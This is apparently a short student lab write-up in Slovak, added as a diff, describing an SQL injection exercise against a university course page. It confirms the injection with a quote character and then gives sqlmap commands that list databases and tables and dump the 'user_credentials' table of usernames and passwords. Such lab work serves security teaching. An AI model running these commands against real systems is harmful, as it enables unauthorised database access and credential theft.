@@ -1,0 +1,20 @@
+Prvym krokom je jednuchy test stranky na SQL injection zranitelnost. Vezmem napr.
+https://minotaur.fi.muni.cz:8443/~xkumpost/bis/part3/sql_injection/?tt=1'
+- dostavam chybu a preto mozem ist stranku testovat.
+Prvym prikazom zistim mena databaz, ktore su vytvorene.
+sqlmap --dbs -u https://minotaur.fi.muni.cz:8443/~xkumpost/bis/part3/sql_injection/?tt=1
+Vysledok Obr1.png
+
+Zaujima ma databaza bis2. Tabulky vytvorene v tejto databaze ziskam prikazom
+sqlmap -D bis2 --tables -u https://minotaur.fi.muni.cz:8443/~xkumpost/bis/part3/sql_injection/?tt=1
+Vysledok Obr2.png
+
+Tu ma zrejme zaujima tabulka user_credentials. Vypisem si stlpce tabulky s prikazom
+sqlmap -D bis2 -T user_credentials --columns -u https://minotaur.fi.muni.cz:8443/~xkumpost/bis/part3/sql_injection/?tt=1
+Vysledok Obr3.png
+
+Mena a k nim hesla si vypisem s prikazom
+sqlmap -D bis2 -T user_credentials --dump -u https://minotaur.fi.muni.cz:8443/~xkumpost/bis/part3/sql_injection/?tt=1
+Vysledok Obr4.png
+
+Mozem dalej pracovat uz len so zistenymi heslami...
